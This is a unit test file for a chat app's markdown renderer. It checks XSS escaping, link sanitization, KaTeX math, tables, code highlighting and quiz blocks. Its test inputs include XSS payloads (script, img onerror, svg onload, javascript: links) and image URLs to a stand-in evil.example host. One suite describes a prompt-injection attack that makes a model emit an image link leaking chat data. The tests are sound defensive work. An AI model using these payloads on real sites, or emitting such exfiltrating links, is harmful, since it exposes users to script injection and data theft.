/**
 * Unit tests for markdown rendering — XSS prevention and feature regression
 */
import { beforeAll, describe, it, expect, vi } from 'vitest';
import { highlightCode, hljs, renderMarkdown, setQuizRenderer } from '@/utils/markdown';
import { renderQuizBlock } from '@/components/QuizBlock';

describe('renderMarkdown XSS prevention', () => {
  it('escapes <script> tags', () => {
    const html = renderMarkdown('<script>alert(1)</script>');
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('escapes <img onerror=...>', () => {
    const html = renderMarkdown('<img src=x onerror=alert(1)>');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
  });

  it('escapes <iframe> tags', () => {
    const html = renderMarkdown('<iframe src="https://evil.com"></iframe>');
    expect(html).not.toContain('<iframe');
    expect(html).toContain('&lt;iframe');
  });

  it('escapes <svg onload=...>', () => {
    const html = renderMarkdown('<svg onload=alert(1)>');
    expect(html).not.toContain('<svg');
    expect(html).toContain('&lt;svg');
  });

  it('escapes raw <a href="javascript:...">', () => {
    const html = renderMarkdown('<a href="javascript:alert(1)">click</a>');
    expect(html).not.toContain('<a href="javascript:');
    expect(html).toContain('&lt;a');
  });

  it('strips javascript: hrefs from markdown links (DOMPurify layer)', () => {
    // marked's own escaping does not cover markdown-syntax links - the
    // sanitizer must neutralize the scheme
    const html = renderMarkdown('[click](javascript:alert(1))');
    expect(html).not.toContain('javascript:');
  });

  it('never emits inline event handlers (DOMPurify layer)', () => {
    const html = renderMarkdown(
      'normal **text** and [link](https://example.com "ti\\" onmouseover=\\"alert(1)")'
    );
    // Parsed, not pattern-matched: the escaped text may stay inside the title
    const div = document.createElement('div');
    div.innerHTML = html;
    const handlers = Array.from(div.querySelectorAll('*')).flatMap((el) =>
      Array.from(el.attributes).filter((attr) => attr.name.startsWith('on'))
    );
    expect(handlers).toEqual([]);
  });

  it('keeps target="_blank" on links through sanitization', () => {
    const html = renderMarkdown('[ok](https://example.com)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});

describe('renderMarkdown preserves legitimate features', () => {
  it('renders markdown links as <a> tags', () => {
    const html = renderMarkdown('[example](https://example.com)');
    expect(html).toContain('<a href="https://example.com"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('example</a>');
  });

  it('renders same-origin markdown images as <img> tags', () => {
    const html = renderMarkdown('![alt text](/static/img.png)');
    expect(html).toContain('<img');
    expect(html).toContain('src="/static/img.png"');
    expect(html).toContain('alt="alt text"');
  });

  it('renders code blocks with wrapper', () => {
    const html = renderMarkdown('```js\nconsole.log("hi");\n```');
    expect(html).toContain('code-block-wrapper');
    expect(html).toContain('<code class="language-js">');
  });

  it('renders bold and italic', () => {
    const html = renderMarkdown('**bold** and *italic*');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<em>italic</em>');
  });

  it('renders tables with wrapper', () => {
    const md = '| A | B |\n|---|---|\n| 1 | 2 |';
    const html = renderMarkdown(md);
    expect(html).toContain('table-wrapper');
    expect(html).toMatch(/<th[ >]/);
    expect(html).toMatch(/<td[ >]/);
  });

  it('renders inline code with HTML-like content safely', () => {
    const html = renderMarkdown('Use `<script>` tag');
    expect(html).toContain('<code>');
    expect(html).not.toContain('<script>');
  });
});

describe('LaTeX math rendering (KaTeX)', () => {
  it('renders inline $...$ math', () => {
    const html = renderMarkdown('The formula $E = mc^2$ is famous.');
    expect(html).toContain('class="katex"');
    expect(html).toContain('katex-html');
  });

  it('renders display $$...$$ math', () => {
    const html = renderMarkdown('$$x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}$$');
    expect(html).toContain('katex-display');
  });

  it('renders multi-line display math', () => {
    const html = renderMarkdown('Result:\n\n$$\nE = mc^2\n$$\n\nDone.');
    expect(html).toContain('katex-display');
  });

  it('renders math inside bold (model emits **$b^2 - 4ac$**)', () => {
    const html = renderMarkdown('The discriminant is **$b^2 - 4ac$**.');
    expect(html).toContain('<strong>');
    expect(html).toContain('class="katex"');
  });

  it('renders math inside parentheses (model emits ($E$))', () => {
    const html = renderMarkdown('energy ($E$) equals mass');
    expect(html).toContain('class="katex"');
  });

  it('leaves currency amounts as plain text', () => {
    const html = renderMarkdown('It costs $5 and $10 total.');
    expect(html).not.toContain('katex');
    expect(html).toContain('$5 and $10');
  });

  it('leaves currency ranges as plain text', () => {
    const html = renderMarkdown('between $5-$10 range');
    expect(html).not.toContain('katex');
  });

  it('does not throw on invalid TeX', () => {
    const html = renderMarkdown('Broken $\\frac{$ math');
    expect(typeof html).toBe('string');
  });
});

describe('KaTeX output mode', () => {
  it('emits visual HTML only - no duplicate MathML block', () => {
    const html = renderMarkdown('Euler: $e^{i\\pi} + 1 = 0$');
    expect(html).toContain('katex-html');
    expect(html).not.toContain('katex-mathml');
  });
});

describe('math isolation from markdown parsing', () => {
  it('preserves subscripts and backslash commands (no markdown mangling)', () => {
    // Markdown would otherwise eat the underscores as emphasis and the
    // backslashes as escapes: \frac{S_t}{K} came out as "KSt"
    const html = renderMarkdown('Then $d_1 = \\ln \\frac{S_t}{K}$ holds.');
    expect(html).toContain('class="katex"');
    expect(html).not.toContain('<em>');
  });

  it('renders \\(...\\) inline delimiters', () => {
    const html = renderMarkdown('energy \\(E = mc^2\\) equals');
    expect(html).toContain('class="katex"');
  });

  it('renders \\[...\\] display delimiters', () => {
    const html = renderMarkdown('\\[x^2 + y^2 = z^2\\]');
    expect(html).toContain('katex-display');
  });

  it('renders display math inside a list item', () => {
    const html = renderMarkdown('1. First\n2. Formula:\n\n   $$a^2 + b^2 = c^2$$\n\n3. Third');
    expect(html).toContain('katex-display');
  });

  it('leaves dollar signs in fenced code blocks alone', () => {
    const html = renderMarkdown('```bash\necho $HOME and $5\n```');
    expect(html).not.toContain('katex');
  });

  it('leaves dollar signs in inline code alone', () => {
    const html = renderMarkdown('Use `$variable$` syntax');
    expect(html).not.toContain('katex');
  });

  it('two inline maths on one line stay separate', () => {
    const html = renderMarkdown('Both $S_t$ and $K_t$ matter.');
    const count = (html.match(/class="katex"/g) ?? []).length;
    expect(count).toBe(2);
  });
});

describe('grounding markers are plain text now', () => {
  it('renders an old marker as ordinary italics (annotations replaced it)', () => {
    const html = renderMarkdown('Kupte u VeloRama _(neověřeno)_.');

    expect(html).toContain('<em>(neověřeno)</em>');
    expect(html).not.toContain('grounding-unverified');
  });
});

describe('numeric table columns', () => {
  const table = `| Metric | Revenue | Margin | Note |
|---|---|---|---|
| Q1 | 1,234,567 Kč | 23.4 percent | strong start |
| Q2 | 987 654 Kč | 19.2 % | |
| Q3 | ~1,111 Kč | 25 pct | slow |`;

  function cells(html: string, col: number): Element[] {
    const el = document.createElement('div');
    el.innerHTML = html;
    return [...el.querySelectorAll(`tr > :nth-child(${col + 1})`)];
  }

  it('marks columns whose every value is a number (with units) as numeric', () => {
    const html = renderMarkdown(table);
    for (const col of [1, 2]) {
      expect(cells(html, col).every((c) => c.classList.contains('num'))).toBe(true);
    }
  });

  it('leaves text columns alone', () => {
    const html = renderMarkdown(table);
    for (const col of [0, 3]) {
      expect(cells(html, col).some((c) => c.classList.contains('num'))).toBe(false);
    }
  });

  it('respects an explicit markdown alignment', () => {
    const html = renderMarkdown('| A | B |\n|:-:|---|\n| 1 | 2 |');
    expect(cells(html, 0).some((c) => c.classList.contains('num'))).toBe(false);
    expect(cells(html, 1).every((c) => c.classList.contains('num'))).toBe(true);
  });
});

describe('external images never load by themselves', () => {
  // A prompt-injected page can make the model emit ![](https://evil/?d=<chat data>):
  // an <img> would send that request the moment the reply renders
  const html = (md: string) => {
    const div = document.createElement('div');
    div.innerHTML = renderMarkdown(md);
    return div;
  };

  it('turns an external image into a link the user can choose to open', () => {
    const div = html('![chart](https://evil.example/x.png?d=secret)');
    expect(div.querySelector('img')).toBeNull();
    const link = div.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://evil.example/x.png?d=secret');
    expect(link?.getAttribute('rel')).toContain('noreferrer');
    expect(link?.textContent).toContain('chart');
  });

  it('shows a raw HTML image as text, never as an image', () => {
    const div = html('<img src="http://evil.example/p.gif" alt="">');
    expect(div.querySelector('img')).toBeNull();
  });

  it('keeps inline data images', () => {
    const div = html('![dot](data:image/png;base64,iVBORw0KGgo=)');
    expect(div.querySelector('img')).not.toBeNull();
  });

  it('keeps same-origin images', () => {
    const div = html('![file](/api/files/abc/thumbnail)');
    expect(div.querySelector('img')?.getAttribute('src')).toBe('/api/files/abc/thumbnail');
  });
});

describe('highlightCode', () => {
  it('escapes the code when highlighting fails', () => {
    // highlightAllCodeBlocks feeds it textContent, where entities are already decoded
    const spy = vi.spyOn(hljs, 'highlightAuto').mockImplementation(() => {
      throw new Error('grammar crashed');
    });
    try {
      expect(highlightCode('<img src=x onerror=alert(1)>')).toBe(
        '&lt;img src=x onerror=alert(1)&gt;',
      );
    } finally {
      spy.mockRestore();
    }
  });
});

describe('```quiz blocks', () => {
  const QUIZ = '{"type":"multiple-choice","question":"Kolik?","options":["1","2"],"correct":1}';
  // What core/startup passes in
  beforeAll(() => setQuizRenderer(renderQuizBlock));

  it('render as the interactive quiz component', () => {
    const html = renderMarkdown('```quiz\n' + QUIZ + '\n```');
    expect(html).toContain('quiz-block quiz-multiple-choice');
    expect(html).toContain('<button class="quiz-option" data-index="1">2</button>');
    expect(html).not.toContain('code-block-wrapper');
  });

  it('fall back to a code block when the JSON does not parse', () => {
    const html = renderMarkdown('```quiz\n{not json\n```');
    expect(html).toContain('code-block-wrapper');
    expect(html).not.toContain('quiz-block');
  });
});
